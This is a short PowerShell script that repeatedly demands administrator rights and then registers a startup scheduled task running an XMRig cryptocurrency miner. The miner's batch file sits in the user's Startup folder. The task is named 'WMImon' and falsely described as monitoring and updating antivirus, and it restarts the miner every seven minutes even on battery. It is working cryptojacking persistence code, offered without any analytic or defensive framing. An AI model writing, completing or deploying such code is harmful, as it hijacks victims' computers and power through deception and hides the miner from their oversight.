#admin prompt
# Check if running as Administrator, loop until granted
while (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    # Attempt to elevate
    $process = Start-Process powershell -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs -PassThru
    
    if (-not $process) {
        Write-Host "Administrator permission is required. Retrying in 3 seconds..."
        Start-Sleep -Seconds 3  # Prevent immediate respawn
    } else {
        Exit  # Close non-elevated instance if elevation succeeds
    }
}


# Define the trigger (run at system startup)
Set-Variable -Name Trigger -Value (New-ScheduledTaskTrigger -AtStartup)

# Define the action (execute the batch script for XMRig)
Set-Variable -Name Action -Value (New-ScheduledTaskAction -Argument "/c C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\xmrig-6.22.2\w.bat" -Execute "cmd.exe")

# Define the task settings
Set-Variable -Name Settings -Value (New-ScheduledTaskSettingsSet -StartWhenAvailable -RestartInterval (New-TimeSpan -Minutes 7) -RestartCount 5 -DontStopIfGoingOnBatteries)

# Register the task
Register-ScheduledTask -Settings $Settings -Action $Action -Trigger $Trigger -Description "Monitor and update Antivirus if any error occurs." -TaskName "WMImon"
